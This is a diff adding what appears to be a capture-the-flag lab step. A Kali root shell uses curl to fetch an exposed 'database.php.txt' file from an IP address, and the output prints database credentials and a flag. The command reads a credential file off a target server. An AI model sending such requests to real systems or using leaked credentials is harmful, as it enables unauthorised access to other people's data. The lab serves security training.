@@ -1,0 +1,17 @@
+┌──(root㉿kali)-[~]
+└─# curl http://98.95.207.28/config/database.php.txt
+<?php
+// FLAG BÁSICA: Credenciais em código fonte
+$db_host = 'db';
+$db_user = 'techcorp_user';
+$db_pass = 'T3chC0rp_S3cr3t_2024!';
+$db_name = 'techcorp_db';
+
+$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
+
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+
+// FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}
+?>
